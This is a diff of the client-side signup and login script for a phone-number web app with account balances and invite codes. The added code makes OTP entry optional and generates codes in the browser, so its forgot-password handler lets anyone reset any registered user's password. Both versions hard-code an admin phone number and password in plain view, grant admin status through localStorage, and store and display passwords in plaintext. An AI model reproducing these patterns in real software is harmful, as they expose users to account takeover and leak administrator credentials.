+        setTimeout(() => {
+            banner.classList.remove('show');
+        }, 7000);
+    }
 
-            // Show OTP Loader Modal
-            document.getElementById('otpLoaderModal').style.display = 'flex';
+    // Send Signup OTP
+    window.sendOTP = function() {  
+        const phone = document.getElementById('regPhone').value.trim();  
+        if(!phone || phone.length < 10) {  
+            showToast("Please enter a valid 10-digit phone number!");  
+            return;  
+        }  
 
-            // Simulate 2.5 seconds network delay for realistic OTP fetching
-            setTimeout(() => {
-                generatedOtp = Math.floor(1000 + Math.random() * 9000).toString();
-                document.getElementById('regOtp').value = generatedOtp;
-                
-                // Hide Loader Modal
-                document.getElementById('otpLoaderModal').style.display = 'none';
-                showToast("OTP sent & fetched successfully!");
-            }, 2500);
-        };
+        document.getElementById('loaderText').innerText = "Sending Verification Code...";
+        document.getElementById('otpLoaderModal').style.display = 'flex';
 
-        // Register Button Click Handler
-        document.getElementById('registerBtn').addEventListener('click', async () => {
-            const phone = document.getElementById('regPhone').value.trim();
-            const pass = document.getElementById('regPass').value.trim();
-            const nick = document.getElementById('regNick').value.trim();
-            const invite = document.getElementById('regInvite').value.trim() || "None";
-            const otp = document.getElementById('regOtp').value.trim();
+        setTimeout(() => {
+            document.getElementById('otpLoaderModal').style.display = 'none';
+            generatedOTP = Math.floor(100000 + Math.random() * 900000).toString();
+            showSmsBanner(generatedOTP);
+            startOtpTimer('sendOtpBtn');
+            showToast("Verification code generated!");
+        }, 800);
+    };  
 
-            if(!phone || !pass || !nick || !otp) {
-                showToast("Please fill all the required fields!");
-                return;
-            }
+    // Send Forgot Password OTP
+    window.sendLoginOTP = function() {
+        const phone = document.getElementById('loginPhone').value.trim();
+        if(!phone || phone.length < 10) {
+            showToast("Please enter your registered phone number first!");
+            return;
+        }
 
-            if(otp !== generatedOtp) {
-                showToast("Invalid Verification Code (OTP)!");
-                return;
-            }
+        document.getElementById('loaderText').innerText = "Sending Verification Code...";
+        document.getElementById('otpLoaderModal').style.display = 'flex';
 
-            try {
-                const userRef = db.collection("users").doc(phone);
-                const userSnap = await userRef.get();
+        setTimeout(() => {
+            document.getElementById('otpLoaderModal').style.display = 'none';
+            generatedOTP = Math.floor(100000 + Math.random() * 900000).toString();
+            showSmsBanner(generatedOTP);
+            startOtpTimer('loginSendOtpBtn');
+            showToast("Verification code sent to your phone!");
+        }, 800);
+    };
 
-                if(userSnap.exists) {
-                    document.getElementById('modalTitle').innerText = "Notice";
-                    document.getElementById('modalSubText').innerText = "Account Status Alert";
-                    document.getElementById('modalBody').innerHTML = `
-                        <div class="vip-box" style="justify-content: center; text-align: center; padding: 15px;">
-                            <span class="vip-value" style="color: #d97706;">This mobile number is already registered!</span>
-                        </div>
-                    `;
-                    
-                    const homeBtn = document.getElementById('goToHomeBtn');
-                    homeBtn.innerText = "Close";
-                    homeBtn.onclick = () => {
-                        document.getElementById('success-modal').style.display = 'none';
-                    };
+    // Register Button Click Handler (OTP is Optional)  
+    document.getElementById('registerBtn').addEventListener('click', async () => {  
+        const phone = document.getElementById('regPhone').value.trim();  
+        const pass = document.getElementById('regPass').value.trim();  
+        const nick = document.getElementById('regNick').value.trim();  
+        const invite = document.getElementById('regInvite').value.trim() || "None";  
+        const otp = document.getElementById('regOtp').value.trim();  
 
-                    document.getElementById('success-modal').style.display = 'flex';
+        if(!phone || !pass || !nick) {  
+            showToast("Please fill all the required fields!");  
+            return;  
+        }  
+
+        // OTP is Optional: If user enters an OTP, we validate it. If left blank, it skips validation.
+        if(otp !== "" && generatedOTP && otp !== generatedOTP) {  
+            showToast("Invalid Verification Code (OTP)!");  
+            return;  
+        }  
+
+        document.getElementById('loaderText').innerText = "Creating Account...";
+        document.getElementById('otpLoaderModal').style.display = 'flex';
+
+        try {  
+            const userRef = db.collection("users").doc(phone);  
+            const userSnap = await userRef.get();  
+
+            document.getElementById('otpLoaderModal').style.display = 'none';
+
+            if(userSnap.exists) {  
+                document.getElementById('modalTitle').innerText = "Notice";  
+                document.getElementById('modalSubText').innerText = "Account Status Alert";  
+                document.getElementById('modalBody').innerHTML = `  
+                    <div class="vip-box" style="justify-content: center; text-align: center; padding: 15px;">  
+                        <span class="vip-value" style="color: #d97706;">This mobile number is already registered!</span>  
+                    </div>  
+                `;  
+                  
+                const homeBtn = document.getElementById('goToHomeBtn');  
+                homeBtn.innerText = "Close";  
+                homeBtn.onclick = () => {  
+                    document.getElementById('success-modal').style.display = 'none';  
+                };  
+
+                document.getElementById('success-modal').style.display = 'flex';  
+                return;  
+            }  
+
+            await userRef.set({  
+                phone: phone,  
+                password: pass,  
+                nickname: nick,  
+                inviteCode: invite,  
+                balance: 0.00,  
+                createdAt: new Date()  
+            });  
+
+            localStorage.setItem('userUID', phone);  
+            localStorage.setItem('uid', phone);  
+
+            document.getElementById('modalTitle').innerText = "Registration Successful";  
+            document.getElementById('modalSubText').innerText = "Your account has been created successfully";  
+            document.getElementById('modalBody').innerHTML = `  
+                <div class="vip-box">  
+                    <span class="vip-label">Phone No</span>  
+                    <span class="vip-value">+91 ${phone}</span>  
+                </div>  
+                <div class="vip-box">  
+                    <span class="vip-label">Password</span>  
+                    <span class="vip-value">${pass}</span>  
+                </div>  
+            `;  
+
+            const homeBtn = document.getElementById('goToHomeBtn');  
+            homeBtn.innerText = "Continue to Home";  
+            homeBtn.onclick = () => {  
+                window.location.href = `index.html?phone=${phone}`;  
+            };  
+
+            document.getElementById('success-modal').style.display = 'flex';  
+
+        } catch (error) {  
+            document.getElementById('otpLoaderModal').style.display = 'none';
+            console.error("Error: ", error);  
+            showToast("Registration failed!");  
+        }  
+    });  
+
+    // Login & Forgot Password Handler
+    document.getElementById('loginBtn').addEventListener('click', async () => {  
+        const phone = document.getElementById('loginPhone').value.trim();  
+        const pass = document.getElementById('loginPass').value.trim();  
+
+        if(!phone || !pass) {  
+            showToast("Please enter phone and password!");  
+            return;  
+        }  
+
+        // --- ADMIN LOGIN CHECK ---  
+        if(!isForgotPasswordMode && phone === "9762331956" && pass === "minakshi@admin") {  
+            localStorage.setItem('userUID', 'ADMIN');  
+            localStorage.setItem('uid', 'ADMIN');  
+            showToast("Admin Login Successful!");  
+            setTimeout(() => {  
+                window.location.href = `admin.html`;  
+            }, 1000);  
+            return;  
+        }  
+        // -------------------------  
+
+        try {  
+            const userRef = db.collection("users").doc(phone);  
+            const userSnap = await userRef.get();  
+
+            if(!userSnap.exists) {  
+                showToast("User not found! Please register first.");  
+                return;  
+            }  
+
+            // IF FORGOT PASSWORD MODE IS ACTIVE
+            if(isForgotPasswordMode) {
+                const otpInput = document.getElementById('loginOtp');
+                const otpVal = otpInput ? otpInput.value.trim() : "";
+
+                // OTP is optional during reset, but if entered it must match
+                if(otpVal !== "" && generatedOTP && otpVal !== generatedOTP) {
+                    showToast("Invalid Verification Code (OTP)!");
                     return;
                 }
 
-                await userRef.set({
-                    phone: phone,
-                    password: pass,
-                    nickname: nick,
-                    inviteCode: invite,
-                    balance: 0.00,
-                    createdAt: new Date()
-                });
-
-                // Save UID in LocalStorage to fix mix history problem
-                localStorage.setItem('userUID', phone);
-                localStorage.setItem('uid', phone);
-
-                document.getElementById('modalTitle').innerText = "Registration Successful";
-                document.getElementById('modalSubText').innerText = "Your account has been created successfully";
-                document.getElementById('modalBody').innerHTML = `
-                    <div class="vip-box">
-                        <span class="vip-label">Phone No</span>
-                        <span class="vip-value">+91 ${phone}</span>
-                    </div>
-                    <div class="vip-box">
-                        <span class="vip-label">Password</span>
-                        <span class="vip-value">${pass}</span>
-                    </div>
-                `;
-
-                const homeBtn = document.getElementById('goToHomeBtn');
-                homeBtn.innerText = "Continue to Home";
-                homeBtn.onclick = () => {
-                    window.location.href = `.html?phone=${phone}`;
-                };
-
-                document.getElementById('success-modal').style.display = 'flex';
-
-            } catch (error) {
-                console.error("Firebase Error: ", error);
-                showToast("Registration failed! Check console.");
-            }
-        });
-
-        // Login Button Handler (With Admin Redirect Support)
-        document.getElementById('loginBtn').addEventListener('click', async () => {
-            const phone = document.getElementById('loginPhone').value.trim();
-            const pass = document.getElementById('loginPass').value.trim();
-
-            if(!phone || !pass) {
-                showToast("Please enter phone and password!");
+                // Update password in Firestore
+                await userRef.update({ password: pass });
+                showToast("Password reset successfully! Please login.");
+                resetLoginFormState();
                 return;
-            }
+            }  
 
-            // --- ADMIN LOGIN CHECK ---
-            if(phone === "9762331956" && pass === "minakshi@admin") {
-                localStorage.setItem('userUID', 'ADMIN');
-                localStorage.setItem('uid', 'ADMIN');
-                showToast("Admin Login Successful!");
-                setTimeout(() => {
-                    window.location.href = `admin.html`;
-                }, 1000);
-                return;
-            }
-            // -------------------------
+            // NORMAL LOGIN MODE
+            const data = userSnap.data();  
+            if(data.password === pass) {  
+                localStorage.setItem('userUID', phone);  
+                localStorage.setItem('uid', phone);  
 
-            try {
-                const userRef = db.collection("users").doc(phone);
-                const userSnap = await userRef.get();
-
-                if(userSnap.exists) {
-                    const data = userSnap.data();
-                    if(data.password === pass) {
-                        // Save UID on Login
-                        localStorage.setItem('userUID', phone);
-                        localStorage.setItem('uid', phone);
-
-                        showToast("Login Successful!");
-                        setTimeout(() => {
-                            window.location.href = `index.html?phone=${phone}`;
-                        }, 1000);
-                    } else {
-                        showToast("Incorrect password!");
-                    }
-                } else {
-                    showToast("User not found! Please register first.");
-                }
-            } catch (error) {
-                console.error("Error: ", error);
-                showToast("Login failed!");
-            }
-        });
-    </script>
-</body>
+                showToast("Login Successful!");  
+                setTimeout(() => {  
+                    window.location.href = `index.html?phone=${phone}`;  
+                }, 1000);  
+            } else {  
+                showToast("Incorrect password! Use 'Forgot Password' if needed.");  
+            }  
+        } catch (error) {  
+            console.error("Error: ", error);  
+            showToast("Action failed!");  
+        }  
+    });  
+</script>
+</body>  
 </html>
